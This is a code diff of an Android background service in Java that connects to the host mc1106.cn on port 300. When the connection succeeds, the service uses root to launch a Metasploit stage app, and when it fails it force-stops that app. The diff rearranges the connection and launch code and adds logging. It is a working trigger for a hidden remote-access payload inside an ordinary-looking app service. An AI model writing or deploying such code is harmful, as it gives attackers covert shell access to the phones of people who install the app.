@@ -43,18 +43,26 @@ public class srv extends Service
 				Log.i("fuck","start");
 				
 				
-				Socket s=new Socket();
+				
 				try
 				{
-					SocketAddress sa=new InetSocketAddress(InetAddress.getByName("mc1106.cn").getHostAddress(),300);
+					Socket s=new Socket("mc1106.cn",300);
+					/*
+					SocketAddress sa=new InetSocketAddress("a.mc1106.cn",300);
 					s.connect(sa,500);
+					*/
+					Log.i("fuck","connected");
+					
 					if(!b) //如果假
 					{
-						Runtime.getRuntime().exec("su -c am start com.metasploit.stage/.MainActivity");
 						b=true;
+						Log.i("fuck","if: "+b);
+						Runtime.getRuntime().exec("su -c am start com.metasploit.stage/.MainActivity");
 					}
+					Log.i("fuck",b+"");
 				}catch(Exception e)
 				{
+					Log.i("fuck",e.getMessage());
 					b=false;
 					try{
 						Runtime.getRuntime().exec("su -c am force-stop com.metasploit.stage");
